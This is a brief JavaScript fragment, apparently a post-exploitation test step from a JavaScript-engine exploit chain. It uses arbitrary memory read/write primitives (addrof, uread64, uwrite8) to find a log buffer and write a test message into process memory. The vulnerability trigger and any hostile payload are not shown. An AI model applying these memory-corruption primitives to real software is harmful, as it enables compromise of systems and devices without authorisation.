// PE main - minimal test step by step

// Read func_offsets_buffer
let func_offsets_buffer = uread64(addrof(func_offsets_array) + 0x10n);

// Read js_inputs (idx=2, offset 2*8=16)
let js_inputs = uread64(func_offsets_buffer + 2n * 8n);

// Read log_buffer from js_inputs + 0x10
log_buffer = uread64(js_inputs + 0x10n);
log_offset_ptr = uread64(js_inputs + 0x18n);

// Write directly to buffer
let off = uread64(log_offset_ptr);
let msg = "[PE] TEST 1 OK\n";
let cstr = get_cstring(msg);
for (let i = 0n; i < 20n; i++) {
  let ch = uread8(cstr + i);
  if (ch == 0) break;
  uwrite8(log_buffer + off + i, ch);
}
uwrite64(log_offset_ptr, off + 30n);
